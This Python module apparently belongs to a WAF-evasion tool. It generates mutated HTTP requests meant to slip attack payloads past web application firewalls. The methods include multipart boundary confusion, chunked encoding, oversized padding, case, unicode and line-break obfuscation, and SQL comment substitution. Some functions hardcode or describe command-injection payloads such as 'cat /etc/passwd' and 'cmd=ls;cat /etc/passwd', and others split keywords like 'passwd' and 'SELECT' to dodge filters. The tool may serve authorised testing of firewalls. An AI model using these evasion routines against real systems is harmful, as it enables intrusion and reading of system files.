import copy
import json
import os
import random
import re
import urllib.parse
import uuid
from utils.logUtils import LoggerSingleton
from utils.dictUtils import content_types
logger = LoggerSingleton().get_logger()
TAG = "prowler_mutant.py: "

def mutant_methods_modify_content_type(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_modify_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        for content_type in content_types:
            headers['Content-Type'] += ';' + content_type
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })
    # else:
    #     for content_type in content_types:
    #         headers['Content-Type'] =  ';'+content_type + ';'
    #         mutant_payloads.append({
    #             'headers': headers,
    #             'url': url,
    #             'method': method,
    #             'data': data,
    #             'files': files
    #         })        
    return mutant_payloads






def mutant_methods_change_request_method(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_change_request_method")
    logger.debug(TAG + "==>headers: " + str(headers))
    if method == 'GET':
        # 解析 URL 和查询参数
        parsed_url = urllib.parse.urlparse(url)
        get_params = urllib.parse.parse_qs(parsed_url.query)
        # add     "Content-Type": "application/x-www-form-urlencoded" to headers
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        # 构建新的 POST 请求
        post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        post_url = post_url.replace('get', 'post')
        post_data = {k: v[0] for k, v in get_params.items()}  # 将查询参数变成 POST 数据
        return headers, post_url, 'POST', post_data, files,True
    else:
        return headers, url, method, data, files,False



# 协议未覆盖绕过
# 在 http 头里的 Content-Type 提交表单支持四种协议：
# •application/x-www-form-urlencoded -编码模式
# •multipart/form-data -文件上传模式
# •text/plain -文本模式
# •application/json -json模式
# 文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 
# 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。
def mutant_methods_fake_content_type(headers,url,method,data,files):
    logger.info(TAG + "==>mutant_methods_fake_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        for content_type in content_types:
            headers['Content-Type'] = content_type + ';'
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })

    return mutant_payloads


def random_case(text):
    """Randomly changes the case of each character in the text."""
    return ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in text])

def insert_comments(text):
    """Insert random comments or spaces in the text to break up keywords."""
    parts = list(text)
    for i in range(1, len(parts) - 1):
        if random.choice([True, False]):
            parts[i] = '/*' + parts[i] + '*/'
    return ''.join(parts)

def mutant_methods_case_and_comment_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_case_and_comment_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = random_case(insert_comments(parsed_url.path))
    obfuscated_query = random_case(insert_comments(parsed_url.query))
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = random_case(insert_comments(data))

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (random_case(insert_comments(filename)), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads

def url_encode_payload(payload):
    """Helper function to URL encode a given payload."""
    return urllib.parse.quote(payload, safe='/:&?=')

def mutant_methods_url_encoding(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_url_encoding")
    logger.debug(TAG + "==>headers: " + str(headers))

    # Create a list to hold the mutated payloads
    mutant_payloads = []

    # URL encode only the query parameters or other parts of the URL
    # Split the URL into components and encode them properly
    parsed_url = urllib.parse.urlparse(url)
    encoded_query = urllib.parse.quote(parsed_url.query, safe='=&')
    encoded_path = urllib.parse.quote(parsed_url.path, safe='/')
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=encoded_path, query=encoded_query))
    
    # URL encode the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = url_encode_payload(data)

    # URL encode file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (url_encode_payload(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads


def mutant_upload_methods_double_equals(headers,url,method,data,files):
    logger.info(TAG + "==>mutant_upload_methods_double_equals")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    # 只有 multipart/form-data 才需要可以使用这个方法
    content_type = headers.get('Content-Type')
    if content_type and re.match('multipart/form-data', content_type) or 'filename' in str(data):
        # 双写等号：如果含有filename，则替换为filename=
        data_str = data.decode()
        if 'filename' in data_str:
            data_str = data_str.replace('filename', 'filename=')
            mutant_payloads.append({
                        'headers': headers,
                        'url': url,
                        'method': method,
                        'data': data_str
                    })
    # if files:
    #     if 'filename' in files:
    #         files['filename'] = files['filename'] + "="
    #         mutant_payloads.append({
    #             'headers': headers,
    #             'url': url,
    #             'method': method,
    #             'data': data,
    #             'files': files
    #         })

    return mutant_payloads

def unicode_obfuscate(text):
    """Helper function to encode ASCII characters into their Unicode equivalent."""
    obfuscated_text = ""
    for char in text:
        if random.choice([True, False]):
            # 50% chance to obfuscate each character
            obfuscated_text += '\\u{:04x}'.format(ord(char))
        else:
            obfuscated_text += char
    return obfuscated_text

def mutant_methods_unicode_normalization(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_unicode_normalization")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply Unicode obfuscation to URL path and query
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = unicode_obfuscate(parsed_url.path)
    obfuscated_query = unicode_obfuscate(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply Unicode obfuscation to the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = unicode_obfuscate(data)

    # Apply Unicode obfuscation to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (unicode_obfuscate(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads
def insert_line_breaks(text):
    """Helper function to insert CR/LF characters randomly in the text."""
    obfuscated_text = ""
    for char in text:
        if random.choice([True, False]):
            obfuscated_text += '%0A'  # LF (Line Feed)
        obfuscated_text += char
    return obfuscated_text

def mutant_methods_line_breaks(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_line_breaks")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply line breaks to URL path and query
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = insert_line_breaks(parsed_url.path)
    obfuscated_query = insert_line_breaks(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply line breaks to the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = insert_line_breaks(data)

    # Apply line breaks to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (insert_line_breaks(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads

def mutant_methods_for_test_use(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_for_test_use")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []
    if data:
        print(data)
        # replace cmd to c%0Amd in data
        data = data.replace('cmd', 'c%0Amd')
        data = data.replace('passwd', 'passw%0Ad')
        data = data.replace('SELECT','se/*comment*/lect')
        print(data)

        # exit()
    url = url.replace('cmd', 'c%0Amd')
    url = url.replace('SELECT','se/*comment*/lect')
    url = url.replace('passwd', 'passw%0Ad')
    print(url)
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads


def mutant_methods_multipart_boundary(headers, url, method, data, files):
    """ 对 boundary 进行变异进而绕过"""
    logger.info(TAG + "==>mutant_methods_multipart_boundary")
    logger.debug(TAG + "==>headers: " + str(headers))
    # 只有 multipart/form-data 才需要可以使用这个方法

    content_type = headers.get('Content-Type')
    if not content_type or not re.match('multipart/form-data', content_type):
        if not 'filename' in str(data):
            return []

    # 解析filename
    data_str = data.decode()
    pattern = re.compile(r'Content-Disposition: form-data;.*filename="([^"]+)"')
    filenames = pattern.findall(data_str)

    # 从Content-Type中解析boundary的正则表达式
    pattern = re.compile(r'boundary=(.*)')
    match = pattern.search(content_type)
    if match:
        boundary = match.group(1)
        logger.debug(TAG + f"Found boundary: {boundary}")
    else:
        # 无boundary
        logger.info(TAG + "No boundary found in Content-Type")
        return []

    # 拼接后为----realBoundary
    boundary0 = '----real'
    boundary1 = 'Boundary'
    mutant_payloads = []
    # 基于 RFC 2231 的boundary构造
    content_type += f'; boundary*0={boundary0}; boundary*1={boundary1}'

    # 构造新的header
    headers.update({'Content-Type': content_type})
    # 构造请求体，第一种是go的解析方式，第二种是flask的解析方式
    # waf解析的边界
    fake_body = f'--{boundary}\r\n'
    fake_body += f'Content-Disposition: form-data; name="field1"\r\n\r\n'
    fake_body += f'fake data\r\n'
    fake_body += f'--{boundary}--\r\n'

    # 真正的源站解析的边界
    real_body = ['', '']
    for filename in filenames:
        real_body[0] += f'--{boundary0}{boundary1}\r\n'
        real_body[0] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
        real_body[0] += f'Content-Type: text/plain\r\n\r\n'
        real_body[0] += f'real data\r\n'
    real_body[0] += f'--{boundary0}{boundary1}--\r\n'

    for filename in filenames:
        real_body[1] += f'--{boundary}{boundary0}{boundary1}\r\n'
        real_body[1] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
        real_body[1] += f'Content-Type: text/plain\r\n\r\n'
        real_body[1] += f'real data\r\n'
    real_body[1] += f'--{boundary}{boundary0}{boundary1}--\r\n'

    for body in real_body:
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data_str+body
        })
    return mutant_payloads

# 资源限制角度绕过WAF
# 超大数据包绕过
# 这是众所周知、而又难以解决的问题。如果HTTP请求POST BODY太大，检测所有的内容，WAF集群消耗太大的CPU、内存资源。因此许多WAF只检测前面的
# 几K字节、1M、或2M。对于攻击者而然，只需要在POST BODY前面添加许多无用数据，把攻击payload放在最后即可绕过WAF检测。
def mutant_methods_add_padding(headers, url, method, data, files):
    """ 绕过WAF的超大数据包检测"""
    logger.info(TAG + "==>mutant_methods_add_padding")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    padding_data = 'x' * 1024  * 5  # 5 kB 的无用数据
    if isinstance(data, bytes) and isinstance(padding_data, str):
        padding_data = padding_data.encode()  # 将 padding_data 转换为字节串
    if isinstance(data, dict):
        from urllib.parse import urlencode
        data = urlencode(data)
    if data:
        data += padding_data
    else:
        data = padding_data
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    return mutant_payloads


# 删除data中的Content-Type
def mutant_methods_delete_content_type_of_data(headers, url, method, data, files):
    """ 删除data中的Content-Type:xxx; """
    logger.info(TAG + "==>mutant_methods_delete_content_type_of_data")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    # 只有 multipart/form-data 才需要可以使用这个方法
    content_type = headers.get('Content-Type')
    if content_type and re.match('multipart/form-data', content_type):
        pattern = r'Content-Type:[^;]+;\s*'
        # 使用re.sub()函数来删除所有匹配的部分
        data_str = data.decode()
        cleaned_data = re.sub(pattern, '', data_str)
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': cleaned_data
        })
    return mutant_payloads

# 请求头变异,改变Content-Type的大小写
def mutant_methods_modify_content_type_case(headers, url, method, data, files):
    """ 变异Content-Type的大小写"""
    logger.info(TAG + "==>mutant_methods_modify_content_type_case")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        headers['Content-Type'] = headers['Content-Type'].upper()
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

# 请求头变异，改变Content-Type这个属性名本身的大小写
def mutant_methods_modify_case_of_content_type(headers, url, method, data, files):
    """ 变异Content-Type这个属性名本身的大小写"""
    logger.info(TAG + "==>mutant_methods_modify_case_of_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        new_content_type = headers.pop('Content-Type')
        headers['content-type'] = new_content_type
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

def mutant_methods_add_Content_Type_for_get_request(headers, url, method, data, files):
    """ 给GET请求添加Content-Type"""
    logger.info(TAG + "==>mutant_methods_add_Content_Type_for_get_request")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if method == 'GET':
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

#为形如/rce_get?cmd=cat%20/etc/passwd的GET请求添加无害命令，如cmd=ls;cat%20/etc/passwd
def mutant_methods_add_harmless_command_for_get_request(headers, url, method, data, files):
    """ 为GET请求添加无害命令"""
    logger.info(TAG + "==>mutant_methods_add_harmless_command_for_get_request")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []

    if method == 'GET':
        if 'cmd' in url:
            url = url.replace('cmd=', 'cmd=ls;')
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

'''分块传输绕过
分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许数据分为多个部分，仅在HTTP/1.1中提供。
长度值为十六进制，也可以通过在长度值后面加上分号做注释，来提高绕过WAF的概率
条件
需要在请求头添加 “Transfer-Encoding=chunked” 才支持分块传输'''

def mutant_methods_chunked_transfer_encoding(headers, url, method, data, files):
    """ 使用分块传输编码，并将请求体拆分为更细的块 """
    logger.info(TAG + "==>mutant_methods_chunked_transfer_encoding")
    mutant_payloads = []
    
    # 仅在HTTP/1.1中支持分块传输编码
    if method in ['POST', 'PUT', 'PATCH']:
        mutated_headers = headers.copy()
        mutated_headers['Transfer-Encoding'] = 'chunked'
        if 'Content-Length' in mutated_headers:
            del mutated_headers['Content-Length']
        # 确保使用HTTP/1.1版本
        mutated_headers['Protocol-Version'] = 'HTTP/1.1'
    
        # 构造分块传输编码的请求体
        def chunked_body(data):
            body = ''
            if data:
                if isinstance(data, dict):
                    from urllib.parse import urlencode
                    data = urlencode(data)
                data = data if isinstance(data, str) else data.decode('utf-8')
                # 将数据拆分为更细的块，例如每个块1个字符
                chunk_size = 1  # 每个块的大小，可以调整为更小的值
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    chunk_length = format(len(chunk), 'x')
                    # 可选择在长度值后添加注释
                    chunk_length_with_comment = chunk_length + ";"
                    body += chunk_length_with_comment + "\r\n"
                    body += chunk + "\r\n"
            # 添加结束块
            body += "0\r\n\r\n"
            return body
    
        mutated_data = chunked_body(data)
    
        mutant_payloads.append({
            'headers': mutated_headers,
            'url': url,
            'method': method,
            'data': mutated_data,
            'files': files
        })
    return mutant_payloads


# 把content-type的值替换为multipart/form-data当作一个载荷
def mutant_methods_multipart_form_data(headers, url, method, data, files):
    """ 使用multipart/form-data编码发送普通参数，并可选添加charset参数 """
    logger.info(TAG + "==>mutant_methods_multipart_form_data")
    mutant_payloads = []

    if method in ['POST', 'PUT', 'PATCH']:
        mutated_headers = copy.deepcopy(headers)

        # 生成随机的boundary
        boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
        # 可选地在Content-Type后添加charset参数
        charset_options = ['', ', charset=ibm500', ', charset=ibm037']

        for charset in charset_options:
            content_type = f'multipart/form-data; boundary={boundary}{charset}'
            mutated_headers['Content-Type'] = content_type

            # 构造multipart/form-data请求体
            multipart_data = ''
            if data:
                if isinstance(data, dict):
                    for name, value in data.items():
                        multipart_data += f'--{boundary}\r\n'
                        multipart_data += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                        multipart_data += f'{value}\r\n'
                elif isinstance(data, str):
                    multipart_data += f'--{boundary}\r\n'
                    multipart_data += f'Content-Disposition: form-data; name="data"\r\n\r\n'
                    multipart_data += f'{data}\r\n'
            if files:
                for name, file_info in files.items():
                    filename = file_info.get('filename', 'file.txt')
                    file_content = file_info.get('content', '')
                    multipart_data += f'--{boundary}\r\n'
                    multipart_data += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                    multipart_data += f'Content-Type: application/octet-stream\r\n\r\n'
                    multipart_data += f'{file_content}\r\n'
            # 添加结束boundary
            multipart_data += f'--{boundary}--\r\n'

            # 更新Content-Length
            mutated_headers['Content-Length'] = str(len(multipart_data))

            mutant_payloads.append({
                'headers': mutated_headers,
                'url': url,
                'method': method,
                'data': multipart_data,
                'files': None  # 已经在multipart_data中处理
            })
    return mutant_payloads

# SQL注释符号绕过
def mutant_methods_sql_comment_obfuscation(headers, url, method, data, files):
    """ 在SQL查询中插入注释来进行混淆 """
    logger.info(TAG + "==> mutant_methods_sql_comment_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))
    
    mutant_payloads = []
    if method == 'GET':
        # 插入SQL注释到URL中
        obfuscated_url = url.replace(" ", "/**/").replace("%20", "/**/")
        # 使用SQL注释符号来替换空格
        
        # 添加变异后的请求
        mutant_payloads.append({
            'headers': headers,
            'url': obfuscated_url,
            'method': method,
            'data': data,
            'files': files
        })
    
    return mutant_payloads

def mutant_methods_convert_get_to_post(headers, url, method, data, files):
    """ 将GET请求转换为POST请求 """
    logger.info(TAG + "==>mutant_methods_convert_get_to_post")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if method == 'GET':
        # 将GET请求转换为POST请求
        mutated_method = 'POST'
        # 提取GET请求的参数
        query = urllib.parse.urlparse(url).query
        url = url.split('?')[0]
        url = url.replace('get', 'post')
        data = {'cmd': 'cat /etc/passwd'}
        # add htest parameters to headers
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers.pop('Content-Type', None)
        # 将GET请求的参数添加到data中
        # data = urllib.parse.urlencode(data)
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': mutated_method,
            'data': data,
            'files': files
        })
    return mutant_payloads
'''
ALL MUTANT METHODS:
mutant_methods_modify_content_type
mutant_methods_fake_content_type
mutant_methods_case_switching
mutant_methods_url_encoding
mutant_methods_unicode_normalization
mutant_methods_line_breaks
mutant_methods_add_padding
mutant_methods_multipart_boundary
mutant_upload_methods_double_equals
mutant_methods_delete_content_type_of_data
mutant_methods_modify_content_type_case
mutant_methods_modify_case_of_content_type
mutant_methods_add_Content_Type_for_get_request
mutant_methods_add_harmless_command_for_get_request
mutant_methods_chunked_transfer_encoding
mutant_methods_multipart_form_data
mutant_methods_sql_comment_obfuscation
mutant_methods_convert_get_to_post

'''
# 为变异方法添加开关
mutant_methods_config = {
    "mutant_methods_modify_content_type": (mutant_methods_modify_content_type, True),
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type, True),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding, True),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
    "mutant_methods_line_breaks": (mutant_methods_line_breaks, True),
    "mutant_methods_add_padding": (mutant_methods_add_padding, True),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True),
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, True),
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case, True),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type, True),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request, True),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request, True),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, True),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True),
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),

}

# 初始化启用的变异方法
mutant_methods = [
    method for method, enabled in mutant_methods_config.values()
    if enabled
]
# mutant_methods = [mutant_methods_multipart_boundary]
# mutant_methods = [mutant_methods_sql_comment_obfuscation]
# mutant_methods = [mutant_methods_add_harmless_command_for_get_request]
# mutant_methods = [mutant_methods_add_Content_Type_for_get_request]
# mutant_methods = [mutant_methods_convert_get_to_post]
# 上传载荷变异方法
mutant_methods_dedicated_to_upload = []

def prowler_begin_to_mutant_payloads(headers, url, method, data,files=None,memory=None,deep_mutant=False):
    logger.info(TAG + "==>begin to mutant payloads")
    url_backup = copy.deepcopy(url)
    mutant_payloads = []
    if os.path.exists("config/memory.json") and not deep_mutant:
        with open("config/memory.json", "r") as f:
            try:
                memories = json.load(f)
            except json.decoder.JSONDecodeError:
                memories = []
        mem_dict = {}
        for mem in memories:
            mem_dict[mem['url']] = mem['successful_mutant_method']
        __url = url.replace('8001', '9001').replace('8002', '9002').replace('8003', '9003')
        if __url in mem_dict:
            if mem_dict[__url] in mutant_methods_config:
                mutant_method, flag = mutant_methods_config[mem_dict[__url]]

                # 调用对应的变异方法
                sub_mutant_payloads = mutant_method(headers, url, method, data, files)
                logger.info(TAG + "==>found url in memory, use method: " + mem_dict[__url])
                # keep original url for result
                mutant_payloads.extend(sub_mutant_payloads)
                for payload in mutant_payloads:
                    payload['original_url'] = url

                return mutant_payloads
    else :
        #打印当前路径
        logger.info(os.getcwd())
        logger.info("memory.json not exists")
        # exit()
    if deep_mutant:
        logger.info(TAG + "==>deep mutant")
        headers,url,method,data,files,success = mutant_methods_change_request_method(headers,url,method,data,files)
        if not success:
            return []
        # print(headers,url,method,data,files)
        # exit()
    for mutant_method in mutant_methods:
        # 对需要变异的参数进行深拷贝
        headers_copy = copy.deepcopy(headers)
        url_copy = copy.deepcopy(url)  # 如果url是字符串，不拷贝也可以
        method_copy = copy.deepcopy(method)  # 如果method是字符串，不拷贝也可以
        data_copy = copy.deepcopy(data)
        files_copy = copy.deepcopy(files) if files else None
        logger.info(TAG + "==>mutant method: " + str(mutant_method))
        sub_mutant_payloads = mutant_method(headers_copy, url_copy, method_copy, data_copy, files_copy)
        # print(str(headers) +"after mutant method " + str(mutant_method))
        # 如果没有子变异载荷，输出警告
        if not sub_mutant_payloads:
            logger.warning(TAG + "==>no sub mutant payloads for method: " + str(mutant_method))
        for sub_mutant_payload in sub_mutant_payloads:
            sub_mutant_payload['mutant_method'] = mutant_method.__name__
        mutant_payloads.extend(sub_mutant_payloads)

    if method == 'UPLOAD':
        for mutant_upload_method in mutant_methods_dedicated_to_upload:
            logger.info(TAG + "==>mutant upload method: " + str(mutant_upload_method))
            headers,url,method,data,files = mutant_upload_method(headers,url,method,data,files=data)
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': data
            })
    # keep original url for result
    for payload in mutant_payloads:
        payload['original_url'] = url_backup
    return mutant_payloads
